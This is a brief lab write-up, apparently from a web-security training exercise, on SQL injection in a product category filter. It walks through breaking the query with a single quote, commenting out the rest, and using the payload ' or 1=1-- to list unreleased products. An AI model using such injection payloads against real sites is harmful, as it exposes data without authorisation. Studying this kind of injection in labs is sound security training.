SQLi Vulnerability - Product Category Filter

*** Query ***

SELECT * FROM products WHERE category = 'Gifts' AND released = 1

*** Objective

Display all products both released an unreleased

*** Analysis

SELECT * FROM products WHERE category = ''' AND released = 1    # Testing with a single quote => "Internal Server Error"
SELECT * FROM products WHERE category = ''--' AND released = 1  # Commenting out

The resulting query will be like below:

SELECT * FROM products WHERE category = ''  # Displays nothing

- We now try to display both released and unreleased products

SELECT * FROM products WHERE category = '' or 1=1--'   # Payload => ' or 1=1--

We then script the exploit
